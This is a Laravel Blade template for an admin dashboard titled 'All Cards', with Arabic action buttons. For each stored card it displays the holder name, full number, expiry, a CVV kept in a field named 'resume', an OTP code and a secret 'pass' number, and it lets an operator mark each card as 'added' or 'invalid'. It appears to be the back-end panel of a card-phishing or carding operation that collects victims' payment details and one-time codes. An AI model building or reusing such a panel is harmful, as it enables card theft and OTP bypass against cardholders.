{{-- <x-app-layout>
  <x-slot name="header">
    <h2 class="font-semibold text-xl text-gray-800 leading-tight">
      {{ __('Dashboard') }}
    </h2>
  </x-slot>

  <div class="py-12">
    <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
      <div class="bg-white overflow-hidden shadow-xl sm:rounded-lg">
        <x-welcome />
      </div>
    </div>
  </div>
</x-app-layout> --}}
@extends('layouts.dashboard')
@section('content')
<!-- Main content -->
<section class="content">
  {{-- write code to show laravel success alerts --}}
  @if (session()->has('success'))
  <div class="alert alert-success">
    <button type="button" class="close text-white " style="opacity: 1" data-dismiss="alert" aria-label="Close">
      X
    </button>
    <span>{{ session()->get('success') }}</span>
  </div>
  @endif
  @if (session()->has('error'))
  <div class="alert alert-danger">
    <button type="button" class="close text-white " style="opacity: 1" data-dismiss="alert" aria-label="Close">
      X
    </button>
    <span>{{ session()->get('error') }}</span>
  </div>
  @endif

    <div class="modal fade" id="modal-clear">
      <div class="modal-dialog">
        <form action="{{route('cards.clear_all')}}">
          @csrf
          @method('DELETE')
                <div class="modal-content bg-danger">
            <div class="modal-header">
              <h4 class="modal-title">Clear All Cards</h4>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
              <p>You are about to clear all cards, are you sure?</p>
            </div>
            <div class="modal-footer justify-content-between">
              <button type="button" class="btn btn-outline-light" data-dismiss="modal">Close</button>
              <button type="submit" class="btn btn-outline-light">Clear now</button>
            </div>
          </div>
          <!-- /.modal-content -->
        </form>
      </div>
      <!-- /.modal-dialog -->
    </div>
    <!-- /.modal -->

  <!-- Default box -->
  <div class="card">
      <div class="card-header">
        <h3 class="card-title">All Cards</h3>
        <!-- <a class="btn btn-danger btn-sm float-right" data-toggle="modal" data-target="#modal-clear">
            <i class="fas fa-trash"></i>
            Clear All Cards
        </a> -->
      </div>
      <div align="center" class="col-12">
                </div>
      <div class="card-body">
      <div class="newModals"></div>
          <div class="row cardsList">

             @foreach ($cards as $card)

              <div class="col-12 col-sm-6 col-md-4 d-flex align-items-stretch flex-column">
                  <div class="card bg-light d-flex flex-fill border  @if($card->is_added && !$card->is_invalid) border-success @elseif($card->is_invalid) border-danger @else border-secondary @endif border-5">
                    <div class="card-header  @if($card->is_added  && !$card->is_invalid) bg-success @elseif($card->is_invalid) bg-danger @else bg-secondary @endif">
                                               {{$card->cname}}
                                            </div>
                      <div class="card-body pt-0">
                          <div class="row">
                              <div class="col-12">
                                  <h2 class="lead mt-2"><b>Name:</b> <span class="text-muted text-sm">{{$card->cname}} </span></h2>
                                  <h2 class="lead mt-2"><b>Number:</b> <span class="text-muted text-sm">{{$card->cnmbr}}  </span></h2>
                                  <h2 class="lead mt-2"><b>Expiry Date:</b> <span class="text-muted text-sm">{{$card->month}}/{{$card->year}} </span></h2>
                                  <h2 class="lead mt-2"><b>CV:</b> <span class="text-muted text-sm">{{$card->resume}}  </span></h2>
                                  <hr class="bg-white">
                                  <h2 class="lead mt-2"><b>Code:</b> <span id="code{{$card->id}}" class="text-muted text-sm">{{$card->otp_code}}  </span></h2>
                                  <h2 class="lead mt-2"><b>pass:</b> <span id="psd{{$card->id}}" class="text-muted text-sm">{{$card->secret_number}} </span></h2>
                              </div>
                          </div>
                      </div>
                      <div class="card-footer">
                          <div class="text-right">
                              <a data-toggle="modal" data-target="#modal-delete-{{$card->id}}" class="btn btn-sm btn-warning">حذف البطاقة</a>
                              <a data-toggle="modal" data-target="#modal-added-{{$card->id}}" class="btn btn-sm btn-success">تم اضافنها</a>
                              <a data-toggle="modal" data-target="#modal-error-{{$card->id}}" class="btn btn-sm btn-danger">غير صالحة</a>
                              <div style="height: 28px; width: 28px" class="rounded rounded-5 shadow float-left p-1 bg-secondary"></div>
                          </div>
                      </div>
                  </div>
              </div>

              <!-- Delete Model -->
              <div dir="rtl" align="right" class="modal fade" id="modal-delete-{{$card->id}}">
                <div class="modal-dialog">
                  <form method="post" action="{{route('cards.destroy',$card->id)}}">
                    @csrf
                    @method('DELETE')
                      <div class="modal-content bg-warning">
                      <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">&times;</span>
                        </button>
                        <h4 class="modal-title">حذف البطاقة {{$card->cname}}</h4>
                      </div>
                      <div class="modal-body">
                        <p>انت على وشك حذف هذه البطاقة, هل انت متأكد!</p>
                      </div>
                      <div class="modal-footer justify-content-between">
                        <button type="submit" class="btn btn-outline-dark">احذف الاًن</button>
                        <button type="button" class="btn btn-outline-dark" data-dismiss="modal">إالغاء</button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>

              <!-- Added Model -->
              <div dir="rtl" align="right" class="modal fade" id="modal-added-{{$card->id}}">
                <div class="modal-dialog">
                  <form method="post" action="{{route('cards.update',$card->id)}}">
                    @csrf
                    @method('PATCH')
                    <input type="hidden" name="status" value="success">
                    <div class="modal-content bg-success">
                      <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">&times;</span>
                        </button>
                        <h4 class="modal-title">إضافة البطاقة {{$card->cname}}</h4>
                      </div>
                      <div class="modal-body">
                        <p>هل اضفت البطاقة !</p>
                      </div>
                      <div class="modal-footer justify-content-between">
                        <button type="submit" class="btn btn-outline-light">نعم</button>
                        <button type="button" class="btn btn-outline-light" data-dismiss="modal">إالغاء</button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>

              <!-- Error Model -->
              <div dir="rtl" align="right" class="modal fade" id="modal-error-{{$card->id}}">
                <div class="modal-dialog">
                  <form method="post" action="{{route('cards.update',$card->id)}}">
                    @csrf
                    @method('PATCH')
                    <input type="hidden" name="status" value="danger">
                    <div class="modal-content bg-danger">
                      <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">&times;</span>
                        </button>
                        <h4 class="modal-title">غير صالحة {{$card->cname}}</h4>
                      </div>
                      <div class="modal-body">
                        <p>البطاقة غير صالحة !</p>
                      </div>
                      <div class="modal-footer justify-content-between">
                        <button type="submit" class="btn btn-outline-light">نعم</button>
                        <button type="button" class="btn btn-outline-light" data-dismiss="modal">إالغاء</button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
              @endforeach






            </div>
      </div>
      <!-- /.card-body -->
    </div>
    <!-- /.card -->





</section>
@endsection